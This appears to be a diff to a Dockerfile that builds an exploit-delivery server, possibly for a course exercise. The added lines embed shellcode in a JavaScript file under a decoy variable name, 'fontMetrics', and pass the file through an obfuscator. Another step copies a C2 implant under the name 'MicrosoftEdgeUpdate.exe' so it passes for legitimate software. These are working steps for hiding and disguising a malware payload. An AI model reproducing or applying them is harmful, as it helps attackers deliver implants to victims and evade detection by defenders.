@@ -45,6 +45,8 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
         mingw-w64 \
         nasm \
         python3 \
+        nodejs \
+        npm \
     && rm -rf /var/lib/apt/lists/*
 
 # Copy cross-compiled OpenSSL Windows static libs
@@ -93,7 +95,7 @@ RUN make clean && make HOST_IP="${C2_HOST_IP}" DOWNLOAD_TOKEN="${DOWNLOAD_TOKEN}
 WORKDIR /opt/exploit/exploit-contents
 COPY exploit-server/exploit-contents/ ./
 
-# Patch shellcode uint32 array into utils.js
+# Patch shellcode uint32 array into utils.js, then obfuscate
 RUN python3 - <<'EOF'
 import struct, re
 data = open('/opt/shellcode-gen/bin/final_shellcode.bin', 'rb').read()
@@ -102,13 +104,22 @@ if r: data += b'\x00' * (4 - r)
 ints = struct.unpack('<' + 'I' * (len(data)//4), data)
 arr = '[' + ', '.join(str(i) for i in ints) + ']'
 content = open('/opt/exploit/exploit-contents/utils.js').read()
-patched, n = re.subn(r'^var shellcode = \[.*?\];',
-                     'var shellcode = ' + arr + ';',
-                     content, flags=re.MULTILINE)
-assert n, 'shellcode line not found in utils.js'
+patched, n = re.subn(r'var fontMetrics\s*=\s*\[.*?\];',
+                     'var fontMetrics = ' + arr + ';',
+                     content, flags=re.DOTALL)
+assert n, 'fontMetrics variable not found in utils.js'
 open('/opt/exploit/exploit-contents/utils.js', 'w').write(patched)
 print('utils.js patched with', n, 'replacement(s)')
 EOF
+
+RUN npm install -g javascript-obfuscator && \
+    javascript-obfuscator /opt/exploit/exploit-contents/utils.js \
+        --output /opt/exploit/exploit-contents/utils.js \
+        --compact true \
+        --control-flow-flattening false \
+        --dead-code-injection false \
+        --string-array true \
+        --self-defending false
 
 # Rename implant.exe to MicrosoftEdgeUpdate.exe (Section 9, Problem 3)
 RUN cp /opt/c2/bin/windows/implant.exe /opt/exploit/MicrosoftEdgeUpdate.exe
